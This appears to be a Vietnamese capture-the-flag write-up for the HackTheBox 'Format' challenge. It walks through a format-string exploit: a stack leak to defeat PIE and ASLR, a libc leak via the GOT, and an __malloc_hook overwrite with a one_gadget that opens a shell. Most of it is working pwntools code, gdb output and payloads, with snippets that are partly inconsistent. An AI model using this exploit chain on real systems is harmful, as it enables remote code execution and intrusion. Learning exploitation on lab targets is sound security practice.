# Can you hear the echo?  
---


- Đầu tiên, chúng ta kiểm tra `checksec` của tệp tin  
```bash
➜  Format git:(main) ✗ checksec format  
[*] '/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
- Dễ dàng thấy hầu hết các cơ chế bảo mật đều được bật ở trên tệp tin này.
- Tựa đề là format, nên ta dễ dàng biết được đây thuộc loại lỗi `format-string`  
```bash
➜  Format git:(main) ✗ ./format
%x.%x.%x.%x
f0623a03.0.f0549142.3a1b8000
```  
- Ta mở bằng ghidra:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  echo();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
```c
void echo(void)

{
  long in_FS_OFFSET;
  char local_118 [264];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    fgets(local_118,0x100,stdin);
    printf(local_118);
  } while( true );
}
```  
- Lỗi này cho phép chúng ta đọc được dữ liệu trên stack. 
- Mở trên gdb, đặt breakpoint tại `printf` của hàn `echo`. Chạy, nhập input và dùng lệnh `x/100gx $rsp` để in ra dữ liệu trên stack và quan sát.  
```bash
pwndbg> x/100gx $rsp
0x7fffffffdc10:	0x4141414141414141	0x4141414141414141
0x7fffffffdc20:	0x0000000a61414141	0x0000038000000380
0x7fffffffdc30:	0x0000038000000380	0x0000038000000380
0x7fffffffdc40:	0x0000038000000380	0x0000038000000380
0x7fffffffdc50:	0x0000038000000380	0x0000038000000380
0x7fffffffdc60:	0x0000038000000380	0x0000038000000380
0x7fffffffdc70:	0x0000038000000380	0x0000038000000380
0x7fffffffdc80:	0x0000000000000000	0x00007ffff7fa85c0
0x7fffffffdc90:	0x0000000000000000	0x00007ffff7e516a5
0x7fffffffdca0:	0x0000000000000000	0x00007ffff7fa85c0
0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcc0:	0x00007ffff7fa94a0	0x00007ffff7e4d6bd
0x7fffffffdcd0:	0x00007ffff7fa85c0	0x00007ffff7e43f65
0x7fffffffdce0:	0x00005555555552d0	0x00007fffffffdd20
0x7fffffffdcf0:	0x00005555555550c0	0x00007fffffffde30
0x7fffffffdd00:	0x0000000000000000	0x000055555555526d
0x7fffffffdd10:	0x00007ffff7facfc8	0xc53e05bd2bae9300
0x7fffffffdd20:	0x00007fffffffdd40	0x00005555555552b3
0x7fffffffdd30:	0x00007fffffffde30	0xc53e05bd2bae9300
0x7fffffffdd40:	0x0000000000000000	0x00007ffff7de30b3
0x7fffffffdd50:	0x00007ffff7ffc620	0x00007fffffffde38
0x7fffffffdd60:	0x0000000100000000	0x0000555555555284
0x7fffffffdd70:	0x00005555555552d0	0xbca385af5106ab45
0x7fffffffdd80:	0x00005555555550c0	0x00007fffffffde30
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
0x7fffffffdda0:	0x435c7a50eba6ab45	0x435c6a1331c8ab45
0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
0x7fffffffddc0:	0x0000000000000000	0x0000000000000001
0x7fffffffddd0:	0x00007fffffffde38	0x00007fffffffde48
0x7fffffffdde0:	0x00007ffff7ffe190	0x0000000000000000
0x7fffffffddf0:	0x0000000000000000	0x00005555555550c0
0x7fffffffde00:	0x00007fffffffde30	0x0000000000000000
0x7fffffffde10:	0x0000000000000000	0x00005555555550ee
0x7fffffffde20:	0x00007fffffffde28	0x000000000000001c
0x7fffffffde30:	0x0000000000000001	0x00007fffffffe1be
0x7fffffffde40:	0x0000000000000000	0x00007fffffffe1fa
0x7fffffffde50:	0x00007fffffffe206	0x00007fffffffe214
0x7fffffffde60:	0x00007fffffffe227	0x00007fffffffe23c
0x7fffffffde70:	0x00007fffffffe244	0x00007fffffffe256
0x7fffffffde80:	0x00007fffffffe292	0x00007fffffffe29a
0x7fffffffde90:	0x00007fffffffe2b1	0x00007fffffffe2cd
0x7fffffffdea0:	0x00007fffffffe2ed	0x00007fffffffe309
0x7fffffffdeb0:	0x00007fffffffe329	0x00007fffffffe334
0x7fffffffdec0:	0x00007fffffffe344	0x00007fffffffe356
0x7fffffffded0:	0x00007fffffffe3b2	0x00007fffffffe3d0
0x7fffffffdee0:	0x00007fffffffe3e4	0x00007fffffffe41a
0x7fffffffdef0:	0x00007fffffffe42c	0x00007fffffffe43b
0x7fffffffdf00:	0x00007fffffffe479	0x00007fffffffe490
0x7fffffffdf10:	0x00007fffffffe4c3	0x00007fffffffe4da
0x7fffffffdf20:	0x00007fffffffe4ea	0x00007fffffffe4fe
```
- Chúng ta thấy có 1 vài giá trị có địa chỉ là `0x5555***` trên stack. Kiểm tra các giá trị này với lệnh `x/i dia_chi`  
```bash
pwndbg> x/i 0x00005555555552d0
   0x5555555552d0 <__libc_csu_init>:	endbr64 
pwndbg> x/i 0x00005555555550c0
   0x5555555550c0 <_start>:	endbr64 
pwndbg> x/i 0x000055555555526d
   0x55555555526d <init+117>:	nop
pwndbg> x/i 0x00005555555552b3
   0x5555555552b3 <main+47>:	mov    eax,0x0
pwndbg> x/i 0x00005555555550ee
   0x5555555550ee <_start+46>:	hlt
```
- Mặt khác, lỗi format-string có thể cho phép chúng ta dump dữ liệu trên stack. Chúng ta sẽ viết 1 đoạn code nhỏ để dump dữ liệu từ stack ra.
```python 
from pwn import *

# HOST = '64.227.36.245'
# PORT = 30730

context.clear(arch="amd64")

# -----------------------
def com(payload, wait=True):
	global r
	r.sendline(payload)
	if (wait):
		return r.recv()


def nonStopLeak():
	data = []
	min_val = 1
	max_val = 50
	log.progress("Starting nonStopLeaking (range: %d to %d)..." % (min_val, max_val))
	data.append("EMPTY ON PURPOSE")
	for i in range(min_val, max_val):
		leak = "%{}$lx".format(i)
		leak = com(leak).strip().decode()
		data.append(leak)

	log.success("nonStopLeaking finalized...")
	return data


# -------------- exploit -----------------------

elf = ELF("format")

r = process("./format")
# input("[+] attach gdb")
# Launch the fmtstr exploiter
exploiter = FmtStr(com)

collected_data = nonStopLeak()
print(collected_data)
r.interactive()
```  
- Tiến hành chạy, ta được kết quả:
```bash
➜  Format git:(main) ✗ python3 exploit.py
[*] '/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './format': pid 13390
[+] attach gdb
[*] Found format string offset: 6
[▆] Starting nonStopLeaking (range: 1 to 40)...
exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline(payload)
[+] nonStopLeaking finalized...
['EMPTY ON PURPOSE', '7f2bcf7e9a03', '0', '7f2bcf70f142', '7fff990a1ad0', '0', '61000a786c243625', '6161616461616163', '5241545361616165', '444e457024362554', '3800000000a', '38000000380', '38000000380', '38000000380', '38000000380', '38000000380', '38000000380', '38000000380', '38000000380', '38000000380', '0', '7f2bcf7ea5c0', '0', '7f2bcf6936a5', '0', '7f2bcf7ea5c0', '0', '0', '7f2bcf7eb4a0', '7f2bcf68f6bd', '7f2bcf7ea5c0', '7f2bcf685f65', '55ddf1fb92d0', '7fff990a1be0', '55ddf1fb90c0', '7fff990a1cf0', '0', '55ddf1fb926d', '7f2bcf7eefc8', 'cdd017be270afb00']
[*] Switching to interactive mode
```
- Tại đây, mình thấy có giá trị `0x55ddf1fb926d` là địa chỉ tại vị trí `init+117`, mình sẽ dùng giá trị này để tính `base address`, bypass cơ chế ASLR và giá trị này nó nằm ở bye thứ 37.
```bash
➜  Format git:(main) ✗ ./format
➜  Format git:(main) ✗ ./format
%37$p
0x56406ae4f26d

```
- Do cơ chế `ASLR` nên giá trị này sẽ khác ở mỗi lần chạy. Bước thứ nhất, chúng ta sẽ vượt qua được cơ chế `ASLR` với đoạn code sau:
```python3
from pwn import *

# HOST = '64.227.36.245'
# PORT = 30730

context.clear(arch="amd64")

# -----------------------
def com(payload, wait=True):
	global r
	r.sendline(payload)
	if (wait):
		return r.recv()


def nonStopLeak():
	data = []
	min_val = 1
	max_val = 40
	log.progress("Starting nonStopLeaking (range: %d to %d)..." % (min_val, max_val))
	data.append("EMPTY ON PURPOSE")
	for i in range(min_val, max_val):
		leak = "%{}$lx".format(i)
		leak = com(leak).strip().decode()
		data.append(leak)

	log.success("nonStopLeaking finalized...")
	return data


# -------------- exploit -----------------------

elf = ELF("./format")

init_117 = 0x126d
r = process("./format")
input("[+] attach gdb")

payload = b'%37$p'
r.sendline(payload)

init_leak = r.recvline()
log.success("LEAK : init+117 address: {}".format(init_leak))
base_elf = int(init_leak,16) - 0x126d
log.info("Base ELF address: {}".format(hex(base_elf)))
elf.address = base_elf 
```  
## Bước 2: Leak địa chỉ `__printf` từ libc thông qua `printf()`  
```bash
pwndbg> disassemble echo
Dump of assembler code for function echo:
   0x0000559e0bc191a9 <+0>:	endbr64 
   0x0000559e0bc191ad <+4>:	push   rbp
   0x0000559e0bc191ae <+5>:	mov    rbp,rsp
   0x0000559e0bc191b1 <+8>:	sub    rsp,0x110
   0x0000559e0bc191b8 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000559e0bc191c1 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000559e0bc191c5 <+28>:	xor    eax,eax
   0x0000559e0bc191c7 <+30>:	mov    rdx,QWORD PTR [rip+0x2e62]        # 0x559e0bc1c030 <stdin@@GLIBC_2.2.5>
   0x0000559e0bc191ce <+37>:	lea    rax,[rbp-0x110]
   0x0000559e0bc191d5 <+44>:	mov    esi,0x100
   0x0000559e0bc191da <+49>:	mov    rdi,rax
   0x0000559e0bc191dd <+52>:	call   0x559e0bc190a0 <fgets@plt>
   0x0000559e0bc191e2 <+57>:	lea    rax,[rbp-0x110]
   0x0000559e0bc191e9 <+64>:	mov    rdi,rax
   0x0000559e0bc191ec <+67>:	mov    eax,0x0
   0x0000559e0bc191f1 <+72>:	call   0x559e0bc19090 <printf@plt>
   0x0000559e0bc191f6 <+77>:	jmp    0x559e0bc191c7 <echo+30>
End of assembler dump.
pwndbg> disassemble 0x559e0bc19090
Dump of assembler code for function printf@plt:
   0x0000559e0bc19090 <+0>:	endbr64 
   0x0000559e0bc19094 <+4>:	bnd jmp QWORD PTR [rip+0x2f25]        # 0x559e0bc1bfc0 <printf@got.plt>
   0x0000559e0bc1909b <+11>:	nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
pwndbg> 
```
- Chúng ta sử dụng `%s` thay vì `%p` bởi vì `%s` sẽ đọc địa giá trị bên trong vùng nhớ được truyền vào printf và in ra cho đến khi gặp giá trị null. Điều đó có nghĩa nếu địa chỉ của vùng `GOT` được đưa vào thì chúng ta có thể in nó sẽ in ra địa chỉ của libc đang chứa trong nó. Cụ thể chúng ta sẽ thực hiện như sau:  
```python3
...
# ------------- Leaking _printf address through printf()
printf_got_ptl = elf.got["printf"]
log.info("printf@got.plt address: {}".format(hex(printf_got_ptl)))
r.sendline(b'AAAA%7$s' + p64(printf_got_ptl))
printf_leak = r.recv()
printf_libc = u64(printf_leak[4:10].ljust(8, b'\x00'))
log.success("Leaked __printf: {}".format(hex(printf_libc)))
...
```  
- Chúng ta lấy địa chỉ `printf@plt` thông qua lệnh `elf.got["printf"]`, sau đó gửi payload có dạng `"AAAA%7$s" + p64(printf_got_ptl)`. Số `7` ở đây là vì địa chỉ của got `p64(printf_got_ptl)` năm ở vị trí thứ 7 trên stack, do đó `%7s` sẽ lấy địa chỉ này ra và in giá trị chứa trong nó cũng chính là địa chỉ `libc`.
- Lệnh `ljust(8, "\x00")` được dùng để thêm các gía trị `\x00` vì cơ chế align  
```bash
➜  Format git:(main) ✗ python3 exploit.py
[*] '/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './format': pid 15866
[+] attach gdb
[+] LEAK : init+117 address: b'0x563d767e026d\n'
[*] Base ELF address: 0x563d767df000
[*] printf@got.plt address: 0x563d767e2fc0
[+] Leaked __printf: 0x7fc6d53d6e10
[*] Stopped process './format' (pid 15866)

````
- Sử dụng `https://libc.blukat.me/`  và địa chỉ của libc vừa có được để kiểm tra phiên bản của libc. 

## Bước 3 chiếm quyền điều khiển  
- Khi kiểm tra với `checksec`, chúng ta thấy rằng binary được setup với `Full RELRO`, điều đó có nghĩa chúng ta không thể ghi đè lên GOT, tuy nhiên nội dung của thư viện libc chúng ta vẫn có thể ghi đực. Do đó, mục tiêu sẽ ghi đè lên con trỏ `__malloc_hook` 
- Khi chúng ta gửi vào `printf()` chuỗi quá lớn, `__malloc_hook` được gọi bất cứ khi nào `malloc()` được dùng.  
- Chúng ta gọi `malloc()` bằng cách gọi `printf("%100000$c")`, lệnh gọi này sẽ cấp phát nhiều byte trên stack và buộc libc phải cấp phát thêm vùng nhớ trên heap thay vì trên stack. 
- Khi đó, chúng ta có thể ghi đè giá trị của `__malloc_hook` bằng `%6n` và thay `AAAA` đầu thành địa chỉ của `__malloc_hook`.  
- Chúng ta sử dụng kĩ thuật `[one_gadget](https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook)` để thực thi `execve("/bin/sh")` trong libc.  
```bash
➜  Format git:(main) ✗ one_gadget libc6_2.27-3ubuntu1_amd64.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
- Tiếp theo, chúng ta tính các địa chỉ cần thiết. Với libc khi chưa chạy, chúng ta đọc địa chỉ của `printf`:  
```bash
➜  Format git:(main) ✗ objdump -TR libc6_2.27-3ubuntu1_amd64.so| grep " printf$"
0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 printf
```
Chúng ta thấy rằng khoảng cách từ printf tới base address là `0x64e80`, do đó, để tính base address, chúng ta lấy địa chỉ của `printf` leak được khi thực thi trừ đi `0x64e80`.  
- Sau khi có được base address, chúng ta tính địa chỉ của `malloc_hook_addr` và `one_gadget` bằng cách lấy base address cộng với khoảng cách của các hàm (lấy bằng cách đọc static)
```python
# Calculating base libc, __malloc_hook and one_gadget ---
base_libc = printf_libc - 0x64e80
malloc_hook_addr = base_libc + 0x00000000003ebc30
one_gadget = base_libc + 0x4f322
```  
- Ta sử dụng `[pwnlib.fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr)` - công cụ khai thác lỗi format string để tính và ghi đè địa chỉ `__malloc_hook` với one gadget và kích hoạt nó.  
```python
# Overriding __malloc_hook with one_gadget ---
p.sendline(fmtstr_payload(6, {malloc_hook_addr: one_gadget}))
p.recv()
p.sendline('%100000$c') # __malloc_hook trigger
p.interactive()
p.close()
```  

### Chạy mã khai thác  
- Chạy mã khai thác, ta có được 
```python
➜  Format git:(main) ✗ python3 exploit.py
[*] '/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 167.99.202.131 on port 32399: Done
[+] LEAK : init+117 address: b'0x55afb922b26d\n'
[*] Base ELF address: 0x55afb922a000
[*] printf@got.plt address: 0x55afb922dfc0
[+] Leaked __printf: 0x7f6b96c3be80
exploit.py:65: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline('%100000$c') # __malloc_hook trigger
[*] trigged malloc_hook
[*] Switching to interactive mode
$ ls
flag.txt
format
run_challenge.sh
$ cat flag.txt
HTB{mall0c_h00k_f0r_th3_w1n!}
$ 
[*] Interrupted
[*] Closed connection to 167.99.202.131 port 32399
➜  Format git:(main) ✗ 
```
### Nguồn tham khảo  
- https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a  
- https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Format/notes.md  